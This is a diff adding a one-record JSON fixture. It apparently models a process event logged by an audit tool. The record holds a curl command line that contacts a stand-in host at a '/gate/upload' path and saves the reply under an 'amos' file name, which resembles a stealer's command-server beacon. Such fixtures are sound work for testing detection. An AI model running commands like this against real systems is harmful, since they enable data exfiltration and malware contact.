@@ -1,0 +1,9 @@
+[
+  {
+    "source": "laurel",
+    "image": "/usr/bin/curl",
+    "commandLine": "curl -s --max-time 2 http://192.0.2.1/gate/upload -o /tmp/amos-resp",
+    "user": "1000",
+    "currentDirectory": "/home/u"
+  }
+]
